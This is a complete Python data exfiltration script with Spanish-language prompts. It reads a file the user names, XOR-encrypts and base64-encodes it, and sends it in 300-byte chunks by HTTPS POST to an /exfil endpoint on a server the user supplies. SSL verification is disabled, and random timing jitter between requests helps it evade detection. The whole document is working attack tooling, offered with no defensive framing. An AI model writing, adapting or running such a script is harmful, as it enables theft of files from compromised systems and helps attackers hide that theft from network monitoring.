import requests
import os
import time
import random
import base64

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def chunk_data(data: bytes, size: int):
    return [data[i:i + size] for i in range(0, len(data), size)]

def main():
    server = input("Introduce la IP Pura o dominio del servidor: ").strip()
    filepath = input("Introduce la ruta del archivo a exfiltrar: ").strip()
    key = input("Introduce la clave XOR compartida: ").encode()

    if not os.path.exists(filepath):
        print(f"[X] Archivo no encontrado: {filepath}")
        return

    with open(filepath, "rb") as f:
        raw_data = f.read()

    encrypted = xor_encrypt(raw_data, key)
    encoded = base64.b64encode(encrypted)
    chunks = chunk_data(encoded, 300)

    print(f"[✓] Enviando {len(chunks)} fragmentos a https://{server}/exfil")

    for i, chunk in enumerate(chunks):
        try:
            response = requests.post(f"https://{server}/exfil", data=chunk, headers={
                "Content-Type": "application/octet-stream",
                "X-Chunk-ID": str(i)
            }, timeout=5, verify=False)  # ⚠️ verify=False desactiva validación SSL
            print(f"[{i+1}/{len(chunks)}] Enviado ({len(chunk)} bytes) - Status: {response.status_code}")
        except Exception as e:
            print(f"[{i+1}/{len(chunks)}] Error: {e}")

        time.sleep(random.uniform(0.5, 2.5))  # Jitter entre 0.5 y 2.5 segundos

    print("[✓] Exfiltración completada.")

if __name__ == "__main__":
    main()
